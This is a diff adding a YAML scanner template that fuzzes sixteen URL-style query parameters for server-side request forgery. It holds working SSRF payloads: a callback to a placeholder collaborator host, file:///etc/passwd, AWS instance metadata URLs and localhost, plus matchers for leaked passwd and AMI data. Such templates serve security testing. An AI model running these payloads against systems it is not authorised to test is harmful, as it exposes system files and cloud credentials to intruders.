@@ -1,0 +1,60 @@
+id: fuzz-param-ssrf
+name: SSRF - Parameter Fuzzing
+version: 1.0
+author: Phantom Team
+severity: medium
+description: >
+  Fuzzes common URL-accepting parameter names with SSRF payloads targeting
+  internal resources, cloud metadata endpoints (AWS), and local files.
+  Checks for indicators of successful internal access.
+
+tags:
+  - ssrf
+  - injection
+  - fuzzing
+  - parameter-discovery
+  - cloud
+
+variables:
+  collaborator: "your-callback-server.com"
+
+requests:
+  - method: GET
+    path:
+      - "/?url={{payload}}"
+      - "/?link={{payload}}"
+      - "/?src={{payload}}"
+      - "/?href={{payload}}"
+      - "/?redirect={{payload}}"
+      - "/?uri={{payload}}"
+      - "/?path={{payload}}"
+      - "/?dest={{payload}}"
+      - "/?target={{payload}}"
+      - "/?fetch={{payload}}"
+      - "/?proxy={{payload}}"
+      - "/?download={{payload}}"
+      - "/?img={{payload}}"
+      - "/?image={{payload}}"
+      - "/?load={{payload}}"
+      - "/?file={{payload}}"
+
+    attack: batteringram
+    payloads:
+      payload:
+        - "http://{{collaborator}}/ssrf-test"
+        - "https://{{collaborator}}/ssrf-test"
+        - "file:///etc/passwd"
+        - "http://169.254.169.254/latest/meta-data"
+        - "http://169.254.169.254/latest/meta-data/ami-id"
+        - "http://127.0.0.1"
+        - "http://localhost"
+
+    matchers:
+      - type: regex
+        regex:
+          - "root:[x*]:0:0:"
+          - "ami-id"
+          - "ami-launch-index"
+        condition: or
+
+stop-at-first-match: true
